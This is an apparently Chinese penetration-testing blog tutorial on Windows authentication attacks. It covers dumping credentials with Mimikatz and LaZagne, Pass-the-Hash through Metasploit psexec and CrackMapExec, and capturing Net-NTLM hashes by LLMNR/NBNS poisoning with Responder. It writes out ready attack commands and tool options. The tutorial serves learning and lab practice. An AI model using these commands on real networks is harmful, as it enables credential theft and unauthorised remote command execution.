---
title: Windows认证攻击
date: 2019-04-06 10:25:26
tags:
	- Pass The Hash
categories: 内网渗透
---

### 0x00 窃取Windows凭证

**Mimikatz**

我们在前面的文章已经提到过，当用户输入用户名密码登录时，用户名密码会被发送到`lsass.exe`进程中，然后`lsass.exe`会将明文密码计算为`NTLM Hash`，在用户登录期间一直保存在内存中。

Mimikatz是法国人Gentil Kiwi编写的一款Windows平台下的神器，它具备很多功能，其中最亮的功能是直接从`lsass.exe`进程里获取`Windows`处于active状态账号的明文密码或`NT Hash`。在Windows >= 8.1情况下，无法提取明文密码，但是可以提取到`NT Hash`。

[Mimikatz下载链接。](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-delegation)

<!-- more -->

工具演示：

![](windows认证攻击\QQ截图20190407101243.png)

**LaZagne**

既然说到提取密码，那么这里不得不说一款神器，它可以用于用户提取用户计算机上的明文密码。例如浏览器记住的密码、WIFI密码等。具体支持提取的密码有：

![](windows认证攻击\softwares.png)

[LaZagne下载地址。](https://github.com/AlessandroZ/LaZagne)

工具演示：

![](windows认证攻击\QQ截图20190407105139.png)

### 0x01 Pass The Hash

在之前的文章中，我们已经知道了Windows在进行Challenge/Response网络验证时，使用的用户密码对应的`NT Hash`加密`Server Challenge`得到Response（验证过程中第三个数据包），因此，我们只要知道用户的`NT Hash`，就可以直接使用Hash向服务器发起认证，并不需要知道明文密码。这种攻击就称之为哈希传递（Pass The Hash）。如果对此还有疑问，请跳转[这里](https://sakuxa.com/2019/04/03/01-Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM/)学习NTLM网络认证。

常用实现Pass The Hash攻击的工具：

- Smbmap
- Smbexec
- Metasploit
- CrackMapExec
- Mimikatz

> mimikatz “privilege::debug” “sekurlsa::pth /user:abc /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c”

接下来我们使用最后两个工具来模拟进行哈希传递攻击。

**NTLM Hash**

在使用工具之前，有一点需要注意的是，我们知道早期Windows会存储用户密码对应的两种Hash值：`LM Hash:NT Hash`，直到Windows Vista和Window Server 2008之后，就只存储`NT Hash`了。为此，有些工具在给其提供Hash值参数时，需要使用`LM Hash:NT Hash`这样的格式，即使没有`LM Hash`，也要使用任意值进行填充以满足格式，通常的做法是填充32个0。但是也有的工具只需要给出`NT Hash`即可。Metasploit中的psexec和CrackMapExec就分别对应这两种情况。

**Meatasploit Psexec**

> Meatasploit中的`psexec`模块可以实现Hash传递攻击，攻击成功后会返回一个Meterpreter Session。

攻击演示：

- `use exploit/windows/smb/psexec`
- 设置smbpass的格式是`LM:NTLM`，但在w2k8中，LM已禁用，所以`LM`处可以随意用32个字符填充满足模块所需的格式即可，比如使用32个0。

![](windows认证攻击\QQ截图20190406101732.png)

**CrackMapExec**

> 使用Hash值进行哈希传递攻击，让目标计算机执行指定的命令（-x "cmd"）。

Kali安装CrackMapExec：

- `apt-get install crackmapexec`

使用格式：

```
crackmapexec  smb  <IP>  -u <Username>  -H <NT hash>  -x "cmd"
```

攻击演示：

使用Hash值进行攻击，让目标计算机执行`msg adminitrator hacked`命令，执行成功后，目标计算机administrator用户的桌面会弹出一个消息框。

![](windows认证攻击\QQ截图20190405101817.png)

**注意：**

如果目标机器安装了KB2871997补丁，那么将不能进行PTH攻击。

查看主机安装了哪些补丁，Powershell下：

> Get-WmiObject -class 'win32_quickfixengineering'

一些例外：

1.即使打了补丁，rid为500（即管理员，administrator）的用户仍可被PTH。

2.安装补丁kb2871997的Win 7/2008 r2/8/2012，可以使用AES keys代替NTLM Hash。在mimikatz抓hash时，可以一并抓到。

> mimikatz “privilege::debug” “sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c”

**参考资料**

https://mp.weixin.qq.com/s/9EUIamh3L87OWy_uqoJXCw

https://mp.weixin.qq.com/s/LZqkclPiZOBtpJJFTiEvQQ

### 0x02 Net-NTLM Hash relay attack

我们知道在网络认证的过程中，数据包传递的并不是NTLM Hash，而是基于NTLM Hash加密challenge随机数得到的Net-NTLM Hash，意味着我们可以通过毒化攻击/中间人攻击获得Net-NTLM Hash,然后对该Hash进行爆破，或者直接使用该Hash进行重放攻击。这小节主要是进行重放攻击。

首先我们知道，SMB、HTTP、LDAP、MSSQL等协议都可以使用NTLM协议进行认证。

**主机名称解析流程：**

在同一内网环境下，当一台Win机器向另一台Win机器以主机名（hostname）的形式请求相应的资源时,正常的通信大致流程如下：

> 1、首先,Windows会先去查找自己hosts文件,无法解析主机名则继续往下。（C:\Windows\System32\drivers\etc\hosts）
>
> 2、检查本地的dns缓存。（ipconfig /displaydns）
>
> 3、如果本地缓存不存在记录,则继续向本地网络中配置的dns服务器去请求。
>
> 4、最后,如果DNS服务器也解析失败,它就会被交给`LLMNR`和`NetBios-NS`协议去处理解析。

**LLMNR**

> `LLMNR`，（Link-Local Multicast Name Resolution），链路本地多播名称解析，是一个基于DNS协议数据包格式的名称解析协议，在DNS不能解析出结果时，最后会使用该协议（以及NBNS）。它存在Windows Vista、Windows Server 2008、Win7、Win8和Win10中。

`LLMNR`与`NBNS`对比：

> 1、NetBIOS基于广播，而LLMNR基于多播（224.0.0.251、UDP 5353）；
>
> 2、NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有Windows Vista和更高版本才支持LLMNR；
>
> 3、LLMNR还支持IPv6，而NetBIOS不支持。

**窃取Net-NTLM Hash**

> - Windows下可以使用Inveigh工具
> - 在Linux下可以使用Responder。
>
> - metasploit也有auxiliary/spoof/llmnr/llmnr_response、auxiliary/spoof/mdns/mdns_response等模块。

**Responder**

Responder是由LaurentGaffie发布的一款功能强大且简单易用的内网渗透工具，将NetBIOS名称服务（NBNS）、LLMNR和MDNS欺骗集于一身。[工具Github地址。](https://github.com/SpiderLabs/Responder)

Responder内置了SMB认证服务器、MSSQL认证服务器、HTTP认证服务器、HTTPS认证服务器、LDAP认证服务器，DNS服务器、WPAD代理服务器，内建FTP、POP3、IMAP、SMTP服务器用于收集明文的凭据。

当我们启动responder时，它会侦听网络中所有的`LLMNR`、`NBNS`名称解析请求数据包，并对请求进行类似于“你要找的机器就是我”的响应，从而将数据引到自己来，并且responder在监听数据包的同时也开启的诸如smb认证服务器等服务，以便在验证中窃取`NetNTLM Hash`。

这意味着，当用户输入不存在、包含错误或者DNS中没有的主机名时，就会使用`LLMNR`、`NBNS`协议在网络中解析主机名，Responder就可以针对这些协议的请求进行响应，并使用内置的认证服务器与用户完成认证交互，然后窃取到`NTLMv2 Hash`。

工具使用

工具安装：`apt-get isntall responder`

Responder会将所有抓取到的hash打印到标准输出接口上同时会以下面的格式存储到安装目录下的`logs/`文件夹下。

- `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`

参数：

```
简单启用：responder -I eth0 -v

Options:
  --version          工具版本。
  -h, --help         帮助信息。
  -A, --analyze      分析模式。会抓取NBNS、LLMNR、浏览器请求，但不会对请求进行响应，可以用于分析目标网络情况。
  
  -I eth0, --interface=eth0      指定网络接口，可以指定'ALL'来使用所有接口。
  -i 10.0.0.21, --ip=10.0.0.21   Local IP to use (only for OSX)
  
  -e 10.0.0.22, --externalip=10.0.0.22   以另一个外部机器的IP进行响应，意味着后面的数据会被引到该IP机器。
  
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
                        
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
                        
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
                        
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
                        
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
                        
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
                        
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
                        
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
                        
  -v, --verbose         Increase verbosity.

```

工具配置文件路径：`/usr/share/responder/Responder.conf`

修改配置文件只针对特定主机响应：

![](windows认证攻击\QQ截图20190408140244.png)

工具演示：

在网络中启用工具。

![](windows认证攻击\QQ截图20190408141317.png)

抓取到Hash：

![](windows认证攻击\QQ截图20190408141627.png)

**参考链接：**

https://mp.weixin.qq.com/s/2CYuNRQIzIDWlU7nWiJ67w

https://2018.zeronights.ru/wp-content/uploads/materials/08-Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know.pdf

https://www.secpulse.com/archives/65503.html

http://baijiahao.baidu.com/s?id=1599333064699003609&wfr=spider&for=pc

https://www.jianshu.com/p/1b545a8b8b1e

https://blog.csdn.net/vevenlcf/article/details/80887753